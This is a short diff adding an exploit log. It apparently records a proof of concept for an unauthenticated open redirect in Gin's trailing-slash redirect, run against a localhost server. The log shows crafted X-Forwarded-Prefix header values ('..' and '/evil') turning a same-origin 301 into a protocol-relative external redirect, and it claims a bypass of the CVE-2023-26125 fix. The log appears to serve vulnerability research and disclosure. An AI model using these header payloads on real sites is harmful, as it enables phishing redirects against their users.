@@ -1,0 +1,15 @@
+==============================================================================
+VULN-001: X-Forwarded-Prefix empty-prefix -> protocol-relative external open redirect
+target: http://localhost:36274
+[INFO] exercising gin code path: gin.go:810-824 redirectTrailingSlash / sanitizePathChars / redirectRequest
+==============================================================================
+[STEP] baseline: GET /hello/john/ with no X-Forwarded-Prefix (expect same-origin 301)
+[INFO] baseline -> HTTP 301, Location: '/hello/john'
+[STEP] attack: resend with header  X-Forwarded-Prefix: ..  (sanitizes to empty -> '//')
+[INFO] attack   -> HTTP 301, Location: '//hello/john'
+[STEP] control: header  X-Forwarded-Prefix: /evil  (prefix injected into Location)
+[INFO] prefix-injection -> HTTP 301, Location: '/evil/hello/john'
+[PROOF] server returned 301 with Location: '//hello/john'
+[PROOF] '//' is a protocol-relative URL -> browser navigates to http(s)://hello/... = EXTERNAL origin, from one unauthenticated header
+[OK] exploit confirmed — X-Forwarded-Prefix:.. turned a same-origin 301 into a protocol-relative external redirect (novel CVE-2023-26125-fix bypass)
+==> VULN-001: CONFIRMED — unauth open redirect: Location: //hello/john (external origin http://hello)
